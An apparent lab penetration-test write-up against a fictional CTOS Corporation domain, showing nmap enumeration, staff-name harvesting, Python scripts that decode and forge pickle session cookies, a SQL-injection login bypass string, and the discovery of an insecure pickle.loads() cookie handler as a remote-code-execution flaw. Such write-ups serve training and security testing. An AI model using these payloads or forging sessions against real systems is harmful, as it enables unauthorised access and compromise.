# Objective
CTOS Corporation delivers cutting-edge managed services, cloud solutions, and cybersecurity expertise to clients of all sizes. You have been hired to perform their annual penetration test against 3 high-value targets in the Active Directory environment. Your task is to identify all vulnerabilties and (if possible) elevate your privileges to Domain Admin.

You have been provided VPN access to their internal network, but no other information.

![](Pasted%20image%2020260831140535.png)

# Host file setup
```python
sudo nxc smb 10.1.24.233 --generate-hosts-file /etc/hosts
SMB         10.1.24.233     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration

Ill start by making a hosts.txt file with all IPs inside

## Open ports
```python
nmap -p- --min-rate=2000 -sT -iL hosts.txt -Pn
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-31 14:09 -0400
Warning: 10.1.61.204 giving up on port because retransmission cap hit (10).
Warning: 10.1.24.233 giving up on port because retransmission cap hit (10).
Nmap scan report for DC01.CTOS.CORP (10.1.24.233)
Host is up (0.14s latency).
Not shown: 64816 closed tcp ports (conn-refused), 691 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49688/tcp open  unknown
49708/tcp open  unknown
49716/tcp open  unknown
49721/tcp open  unknown
49805/tcp open  unknown

Nmap scan report for 10.1.206.115
Host is up (0.097s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman

Nmap scan report for 10.1.61.204
Host is up (0.096s latency).
Not shown: 64638 closed tcp ports (conn-refused), 895 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 3 IP addresses (3 hosts up) scanned in 213.67 seconds
```

## Nmap
```python
nmap -p- -A --min-rate=2000 -sT -iL hosts.txt -Pn

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-31 18:18:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Not valid before: 2026-02-15T20:12:45
|_Not valid after:  2027-02-15T20:12:45
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Not valid before: 2026-02-15T20:12:45
|_Not valid after:  2027-02-15T20:12:45
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Not valid before: 2026-02-15T20:12:45
|_Not valid after:  2027-02-15T20:12:45
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Not valid before: 2026-02-15T20:12:45
|_Not valid after:  2027-02-15T20:12:45
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTOS
|   NetBIOS_Domain_Name: CTOS
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: CTOS.CORP
|   DNS_Computer_Name: DC01.CTOS.CORP
|   DNS_Tree_Name: CTOS.CORP
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-31T18:19:46+00:00
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Not valid before: 2026-08-12T15:59:39
|_Not valid after:  2027-02-11T15:59:39
|_ssl-date: 2026-08-31T18:20:26+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing


Nmap scan report for 10.1.206.115
Host is up (0.12s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-31T18:20:26+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CTOS
|   NetBIOS_Domain_Name: CTOS
|   NetBIOS_Computer_Name: IT-WS01
|   DNS_Domain_Name: CTOS.CORP
|   DNS_Computer_Name: IT-WS01.CTOS.CORP
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-31T18:19:48+00:00
| ssl-cert: Subject: commonName=IT-WS01.CTOS.CORP
| Not valid before: 2026-08-12T16:48:20
|_Not valid after:  2027-02-11T16:48:20
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



Nmap scan report for 10.1.61.204
Host is up (0.12s latency).
Not shown: 64391 closed tcp ports (conn-refused), 1142 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4c:b2:d9:53:df:da:8e:18:c3:63:71:48:6d:48:f5:39 (ECDSA)
|_  256 72:ba:15:78:a7:2c:71:c5:ab:cc:e5:04:16:14:2b:15 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Home | Enterprise Technology Solutions
```


# SSH (22) WEB-01
## Auth method
```python
ssh root@ctos.site  
The authenticity of host 'ctos.site (10.1.61.204)' can't be established.
ED25519 key fingerprint is: SHA256:ZQjE35p7M8AdW6EBRRcXF+xTwL3z8MqGNTKmJE9tR0M
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ctos.site' (ED25519) to the list of known hosts.
root@ctos.site's password:
```

It uses password based authentication

# HTTP (80) WEB-01

![](Pasted%20image%2020260831142035.png)

There are no subdomains

Feroxbuster found `/login`

The about page holds some users

![](Pasted%20image%2020260831142129.png)

```python
marcus chen
elena rodriguez
james wilson
sarah mitchell
david park
lisa conrad
```

I could potentially run these users against username anarchy to generate some combinations then user kerburte to vaidate

Also the session ID is interesting

```python
gASV4gAAAAAAAACMA2FwcJSMC1Nlc3Npb25EYXRhlJOUKYGUfZQojAp2aXNpdG9yX2lklIwQZTVmMTQ3ZmVlYjBkNmNiZpSMBXRoZW1llIwFbGlnaHSUjA12aXNpdGVkX3BhZ2VzlF2UKIwBL5SMBi9hYm91dJSMCS9zZXJ2aWNlc5SMBS9uZXdzlIwIL2NhcmVlcnOUjAgvY29udGFjdJRljAtmaXJzdF92aXNpdJSMGjIwMjYtMDgtMzFUMjM6NDY6MTkuODkwMjEylIwIdXNlcm5hbWWUTowNYXV0aGVudGljYXRlZJSJdWIu
```

![](Pasted%20image%2020260831145236.png)

To decode this ill base64 decode the value then use a script that uses the pickle library to make it fully readable

```python
import base64
import pickle
import sys

# 1. Fake the application module structure so pickle doesn't crash
class DummyClass(object):
    def __reduce__(self):
        return (self.__class__, ())

# Inject our dummy class into sys.modules so Python thinks 'app.SessionData' exists
import types
app_module = types.ModuleType("app")
app_module.SessionData = DummyClass
sys.modules["app"] = app_module

# 2. Your string
b64_string = "gASV4gAAAAAAAACMA2FwcJSMC1Nlc3Npb25EYXRhlJOUKYGUfZQojAp2aXNpdG9yX2lklIwQZTVmMTQ3ZmVlYjBkNmNiZpSMBXRoZW1llIwFbGlnaHSUjA12aXNpdGVkX3BhZ2VzlF2UKIwBL5SMBi9hYm91dJSMCS9zZXJ2aWNlc5SMBS9uZXdzlIwIL2NhcmVlcnOUjAgvY29udGFjdJRljAtmaXJzdF92aXNpdJSMGjIwMjYtMDgtMzFUMjM6NDY6MTkuODkwMjEylIwIdXNlcm5hbWWUTowNYXV0aGVudGljYXRlZJSJdWIu"

# 3. Decode and Unpickle
pickle_bytes = base64.b64decode(b64_string)
session_obj = pickle.loads(pickle_bytes)

# 4. View the internal attributes of the session object
print(vars(session_obj))
```

Ill use this script to do it

```python
python3 decode.py 
{'visitor_id': 'e5f147feeb0d6cbf', 'theme': 'light', 'visited_pages': ['/', '/about', '/services', '/news', '/careers', '/contact'], 'first_visit': '2026-08-31T23:46:19.890212', 'username': None, 'authenticated': False}
```

It is now decoded

I can then user the following encode script to try and forge a session token

```python
import base64
import pickle
import sys
import types

# 1. Recreate the 'app.SessionData' module structure so the target server recognizes the object type
class SessionData:
    def __init__(self, username, authenticated):
        self.visitor_id = "e5f147feeb0d6cbf"
        self.theme = "light"
        self.visited_pages = ["/", "/about", "/services", "/news", "/careers", "/contact"]
        self.first_visit = "2026-08-31T23:46:19.890212"
        self.username = username
        self.authenticated = authenticated

# Inject the class into sys.modules as 'app.SessionData'
app_module = types.ModuleType("app")
app_module.SessionData = SessionData
sys.modules["app"] = app_module

def main():
    print("--- HackSmarter Session Encoder ---")
    
    # Take user input for the target attributes
    username = input("Enter username (e.g., admin): ").strip()
    auth_input = input("Set authenticated status (true/false): ").strip().lower()
    
    # Convert input string to actual boolean value
    authenticated = True if auth_input in ['true', 't', '1', 'yes'] else False
    
    # Handle 'None' or empty values for username
    if username == "None" or username == "":
        username = None

    # 2. Instantiate the session object with the custom values
    custom_session = SessionData(username=username, authenticated=authenticated)
    
    # 3. Serialize the object using Python Pickle
    pickle_bytes = pickle.dumps(custom_session, protocol=4)
    
    # 4. Encode the binary bytes to Base64 text
    b64_encoded = base64.b64encode(pickle_bytes).decode('utf-8')
    
    print("\n[+] Generated Session String:")
    print(b64_encoded)

if __name__ == "__main__":
    main()
```

Ive tried this script setting the username to `admin` and it failed

So ive tried many combinations on this, i think this is a dead end at least for now, even tried generating a list of users based on the staff page then using them and still failing

# Access to `/portal` (port 80 WEB-01)

```python
`admin' OR '1'='1`
```

![1145](Pasted%20image%2020260831152132.png)

There is really only one interesting link on this page for an `Site Archive`

This link downloads a zip file

There is an RCE vulnerability in the `app.py`

```python
def get_session():
    cookie = request.cookies.get('ctos_session')
    if cookie:
        try:
            data = base64.b64decode(cookie)
            return pickle.loads(data)   # <-- here
        except:
            pass
    return None
```

The app takes the `ctos_session` cookie - a value fully controlled by the client/visitor - base64-decodes it, and feeds it straight into `pickle.loads()`



